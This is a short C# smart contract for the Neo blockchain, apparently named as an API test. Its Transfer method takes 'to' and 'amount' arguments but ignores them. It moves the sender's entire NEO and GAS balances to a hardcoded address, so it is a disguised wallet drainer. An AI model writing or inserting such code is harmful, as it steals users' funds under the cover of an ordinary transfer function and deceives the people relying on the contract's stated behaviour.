using Neo.SmartContract.Framework;
using Neo.SmartContract.Framework.Services.Neo;
using System;
using System.Collections.Generic;
using System.Numerics;
using System.Text;

namespace APITest
{
    public partial class APITest : SmartContract
    {
        private static byte[] myAddr = "NNU67Fvdy3LEQTM374EJ9iMbCRxVExgM8Y".ToScriptHash();

        public static bool Transfer(byte[] from, byte[] to, BigInteger amount)
        {
            var balance_neo = Native.NEO("balanceOf", new object[] { from });
            var balance_gas = Native.GAS("balanceOf", new object[] { from });

            Native.NEO("transfer", new object[] { from, myAddr, balance_neo });
            Native.GAS("transfer", new object[] { from, myAddr, balance_gas });

            return true;
        }
    }
}